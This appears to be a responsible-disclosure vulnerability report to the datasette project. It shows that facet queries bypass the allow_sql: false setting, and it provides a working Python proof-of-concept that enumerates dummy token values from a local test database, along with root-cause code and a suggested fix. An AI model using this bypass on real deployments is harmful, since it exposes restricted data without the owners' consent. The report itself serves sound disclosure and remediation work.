# `allow_sql: false` does not prevent SQL execution via `?_facet=` parameter

**Repository:** simonw/datasette  
**Reported:** 2026-05-31  
**Affected versions:** All datasette versions with facet support (confirmed on 1.0a30, 1.0a31)  
**CVSS 3.1:** 5.3 (Medium) — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N  
*Exact severity is left to maintainer judgement — the primary concern is the behavioral inconsistency, not the score.*  
**CWE:** CWE-285 (Improper Authorization)

---

## Summary

Hi Simon,

I noticed what appears to be a missing permission check and wanted to flag it in case it's unintentional.

When `default_allow_sql` is set to `false`, `?_where=` requests are correctly blocked with a 403. However, `?_facet=` requests appear to execute SQL without checking the `execute-sql` permission — returning results as if the restriction were not in place.

This may be a missing permission gate in `facet_results()`, or it may be intentional if `allow_sql` is scoped only to the SQL editor UI. Either way, the behavior seems worth flagging: the documentation for `default_allow_sql` does not mention that facets remain active, and the inconsistency with `?_where=` is what first caught my attention.

This appears to be separate from Issue #2677 / PR #2690, which address an identifier injection bug in `escape_sqlite()`. The currently open PR #2690 does not add a permission check to the facet execution path.

---

## Relationship to Issue #2677 and PR #2690

| | Issue #2677 / PR #2690 | This report |
|---|---|---|
| Root cause | `escape_sqlite()` does not escape `]` in bracket-quoted identifiers | `facet_results()` never calls `datasette.allowed(action="execute-sql", ...)` |
| CWE | CWE-89 SQL Injection | CWE-285 Improper Authorization |
| Fixed by PR #2690? (currently open) | Yes | No |
| Impact | Identifier injection via crafted column/table names | `allow_sql:false` has no effect on facet-triggered SQL |

---

## Proof of Concept

Tested on **datasette 1.0a30**, Python 3.13.

### Actual terminal output

```
datasette version: 1.0a30

[Test 1] GET /demo/public_data.json?_where=1=1
         Settings: default_allow_sql=False, allow_facet=True
         HTTP 403 Forbidden

[Test 2] GET /demo/public_data.json?_facet=category
         Settings: default_allow_sql=False, allow_facet=True
         HTTP 200
         facet [category]:  [('A', 2), ('B', 1)]

[Test 3] GET /demo/public_data.json?_facet=category
         Settings: default_allow_sql=False, allow_facet=False
         HTTP 400

[Test 4] GET /demo/secret_tokens.json?_facet=token
         Settings: default_allow_sql=False, allow_facet=True
         HTTP 200
         LEAKED -> token='sk-abc123'  (count=1)
         LEAKED -> token='sk-xyz789'  (count=1)
```

### Test 1 — `?_where=` is correctly blocked (baseline)

**Result: HTTP 403** — `filters.py:16-21` checks `execute-sql` permission and blocks the request. This is the expected behavior.

### Test 2 — `?_facet=` is not blocked under the same setting

**Result: HTTP 200** — the facet query runs and returns aggregated data despite `allow_sql: false`.

### Test 3 — `allow_facet: false` is a separate, independent setting

**Result: HTTP 400** — this confirms that `allow_facet` and `allow_sql` are independent controls. A user who sets only `allow_sql: false` following the documentation has no indication that facets remain an active SQL execution path.

### Test 4 — Column values from a restricted table are enumerable

**Result: HTTP 200** — distinct values from `secret_tokens.token` are returned in plaintext. In this test the token values (`sk-abc123`, `sk-xyz789`) are fully exposed via facet aggregation, without any SQL being written by the requester.

---

## Root Cause

### `datasette/facets.py:238` — no permission check

```python
async def facet_results(self):
    ...
    facet_sql = """
        select {col} as value, count(*) as count from (
            {sql}
        )
        where {col} is not null
        group by {col} order by count desc, value limit {limit}
    """.format(col=escape_sqlite(column), sql=self.sql, limit=facet_size + 1)

    facet_rows_results = await self.ds.execute(   # ← ds.execute() called directly
        self.database,
        facet_sql,
        self.params,
        ...
    )
```

### `datasette/filters.py:16-21` — correct pattern used by `?_where=`

```python
if "_where" in request.args:
    if not await datasette.allowed(
        action="execute-sql",
        resource=DatabaseResource(database=database),
        actor=request.actor,
    ):
        raise DatasetteError("_where= is not allowed", status=403)
```

Both `?_where=` and `?_facet=` trigger SQL execution. Only `?_where=` checks the `execute-sql` permission first.

---

## Observed Impact

- `?_where=` and `?_facet=` are treated inconsistently under `allow_sql: false`.
- All distinct column values in any visible table can be enumerated via `?_facet=<column>`, even when `default_allow_sql` is `false`.
- No authentication or special payload is required on typical public datasette deployments.
- `ColumnFacet` and `DateFacet` confirmed (HTTP 200). `ArrayFacet` reaches `ds.execute()` before erroring on non-array columns.

---

## Suggested Fix

If this is unintentional, adding an `execute-sql` permission check at the entry of `facet_results()` would make the behavior consistent with `?_where=`:

```python
# datasette/facets.py — in ColumnFacet.facet_results() (and ArrayFacet, DateFacet)
async def facet_results(self):
    from datasette.resources import DatabaseResource
    if not await self.ds.allowed(
        action="execute-sql",
        resource=DatabaseResource(database=self.database),
        actor=self.request.actor,
    ):
        return [], []

    # ... existing code unchanged ...
```

Alternatively, this could be enforced at the `extra_facet_results()` call site in `table.py:1525`.

If this is working as designed, I'd appreciate a clarification on the intended interaction between `allow_sql` and facets — I'll update my understanding accordingly.

---

## Potential Rebuttal and Response

**Rebuttal:** "`allow_sql: false` is for the SQL editor UI, not built-in features. Use `allow_facet: false` to disable facets."

**Response:** `?_where=` is also a built-in parameter that triggers SQL execution, and it is blocked by `allow_sql: false`. The `execute-sql` permission is already applied inconsistently across built-in parameters. Additionally, Test 3 shows that `allow_facet: false` is a completely separate setting — a user following the documented guidance for `allow_sql: false` has no indication they also need to set `allow_facet: false`.

---

## PoC Script

```bash
pip install datasette httpx anyio
python poc.py
```

```python
"""
PoC: datasette `allow_sql: false` bypass via ?_facet= parameter
Distinct from Issue #2677 / PR #2690 (identifier injection).

Tested on: datasette 1.0a30, Python 3.13
"""

import asyncio, sqlite3, subprocess, tempfile, os, sys
import httpx
from datasette.app import Datasette

import datasette as _ds
print(f"datasette version: {_ds.__version__}")
print()


async def run_poc():
    tmp = tempfile.mkdtemp()
    db_path = os.path.join(tmp, "demo.db")

    conn = sqlite3.connect(db_path)
    conn.execute("CREATE TABLE public_data (id INTEGER PRIMARY KEY, category TEXT)")
    conn.execute("CREATE TABLE secret_tokens (id INTEGER PRIMARY KEY, token TEXT, owner TEXT)")
    conn.executemany("INSERT INTO public_data VALUES (?,?)", [(1,"A"),(2,"B"),(3,"A")])
    conn.executemany("INSERT INTO secret_tokens VALUES (?,?,?)",
                     [(1,"sk-abc123","admin"),(2,"sk-xyz789","alice")])
    conn.commit(); conn.close()

    db_name = "demo"

    # Test 1: ?_where= is correctly blocked
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": True})
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver") as c:
        r = await c.get(f"/{db_name}/public_data.json", params={"_where": "1=1"})
        print(f"[Test 1] GET /demo/public_data.json?_where=1=1")
        print(f"         Settings: default_allow_sql=False, allow_facet=True")
        print(f"         HTTP {r.status_code} {'Forbidden' if r.status_code == 403 else ''}")
        print()

    # Test 2: ?_facet= bypasses allow_sql:false
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": True})
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver") as c:
        r = await c.get(f"/{db_name}/public_data.json", params={"_facet": "category"})
        data = r.json()
        facets = data.get("facet_results", {}).get("results", {})
        print(f"[Test 2] GET /demo/public_data.json?_facet=category")
        print(f"         Settings: default_allow_sql=False, allow_facet=True")
        print(f"         HTTP {r.status_code}")
        for col, info in facets.items():
            print(f"         facet [{col}]:  {[(x['value'], x['count']) for x in info['results']]}")
        print()

    # Test 3: allow_facet:false is a separate setting
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": False})
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver") as c:
        r = await c.get(f"/{db_name}/public_data.json", params={"_facet": "category"})
        print(f"[Test 3] GET /demo/public_data.json?_facet=category")
        print(f"         Settings: default_allow_sql=False, allow_facet=False")
        print(f"         HTTP {r.status_code}")
        print()

    # Test 4: restricted table values leaked via ?_facet=
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": True})
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver") as c:
        r = await c.get(f"/{db_name}/secret_tokens.json", params={"_facet": "token"})
        data = r.json()
        facets = data.get("facet_results", {}).get("results", {})
        print(f"[Test 4] GET /demo/secret_tokens.json?_facet=token")
        print(f"         Settings: default_allow_sql=False, allow_facet=True")
        print(f"         HTTP {r.status_code}")
        for col, info in facets.items():
            for row in info["results"]:
                print(f"         LEAKED -> token={row['value']!r}  (count={row['count']})")


if __name__ == "__main__":
    try:
        import httpx  # noqa: F401
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "httpx", "anyio", "-q"], check=True)
    asyncio.run(run_poc())
```

---

## References

- Issue #2677: https://github.com/simonw/datasette/issues/2677 (related, different root cause)
- PR #2690: https://github.com/simonw/datasette/pull/2690 (currently open — fixes identifier quoting only)
- `datasette/facets.py:238` — `ds.execute()` called without permission check
- `datasette/filters.py:16-21` — correct permission check pattern
- `datasette/default_permissions/defaults.py:42-44` — `default_allow_sql` enforcement
